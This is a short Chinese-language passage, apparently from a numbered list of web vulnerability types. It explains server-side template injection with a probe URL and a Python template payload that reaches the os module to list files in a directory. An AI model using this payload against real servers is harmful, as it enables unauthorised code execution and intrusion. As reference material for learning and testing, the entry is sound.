...
16、模板注入，在{{xxx}}中输入的命令参数可被执行，如：www.baidu.com/{{1+1}}，以Python为例，列出当前目录下所有文件的Payload：{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
...
![c437ffd30e608e079623ee01cf1b4ca](img\c437ffd30e608e079623ee01cf1b4ca.jpg)
